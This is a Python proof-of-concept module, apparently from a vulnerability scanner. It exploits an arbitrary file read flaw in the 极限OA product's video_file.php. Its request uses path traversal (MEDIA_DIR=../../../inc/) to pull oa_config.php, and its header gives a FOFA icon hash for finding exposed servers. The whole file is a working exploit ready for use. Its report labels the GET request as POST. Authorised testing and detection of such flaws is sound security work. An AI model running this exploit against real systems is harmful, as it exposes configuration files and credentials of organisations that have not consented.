'''
Function:
    极限OA video_file.php存在任意文件读取漏洞
Author:
    夜梓月
Email：
    yeziyue@hscsec.cn
Blog:
    https://www.cnblogs.com/zy4024/
GitHub:
    https://github.com/spmonkey/
Ps
    version:极限OA
    fofa:icon_hash="1967132225"
'''
# -*- coding: utf-8 -*-
import requests
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from modules import get_user_agent


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': get_user_agent.get_user_agent(),
        }
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        url = "{}://{}/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php".format(scheme, netloc)
        try:
            result = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
            if "PATH" in result.text and "<?" in result.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件读取漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path+"?"+target.query, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                return True
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
            return self.result_text
        else:
            return False

